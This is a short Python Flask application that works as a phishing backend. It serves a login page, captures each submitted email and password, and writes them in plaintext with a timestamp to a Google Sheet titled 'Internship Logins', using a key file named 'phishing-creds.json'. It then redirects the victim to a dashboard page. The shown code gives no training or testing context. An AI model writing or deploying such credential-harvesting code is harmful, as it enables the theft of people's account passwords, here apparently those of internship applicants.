from flask import Flask, render_template, request, redirect
import os
import gspread
from oauth2client.service_account import ServiceAccountCredentials
from datetime import datetime

app = Flask(__name__)

# Google Sheets setup
scope = ["https://spreadsheets.google.com/feeds", "https://www.googleapis.com/auth/drive"]
creds = ServiceAccountCredentials.from_json_keyfile_name("phishing-creds.json", scope)
client = gspread.authorize(creds)
sheet = client.open("Internship Logins").sheet1

@app.route('/')
def home():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Log to Google Sheet
    sheet.append_row([email, password, timestamp])

    return redirect('/dashboard')

@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html')

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
